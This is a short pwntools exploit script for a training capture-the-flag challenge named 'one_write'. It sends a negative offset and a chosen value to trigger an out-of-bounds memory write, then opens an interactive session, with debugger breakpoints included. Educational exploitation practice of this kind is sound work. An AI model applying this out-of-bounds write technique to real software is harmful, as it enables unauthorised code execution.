
from pwn import *

COMMANDS = """
brva 0x1787
brva 0x15bE
brva 0x16f3
brva 0x15ab
brva 0x174b
c
"""

chall_path = "./one_write"

if args.REMOTE:
    c = remote("one-write.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug(chall_path, gdbscript=COMMANDS)
    else:
        c = process(chall_path)

c.recvuntil(b"Choice: ")
input("Received choice request: ")
c.send(b"2")

c.recvuntil(b"Offset: ")
input("Received offset request: ")
c.send(b"-96")

c.recvuntil(b"Value: ")
replacement = b"25385" 
c.send(replacement)

c.interactive()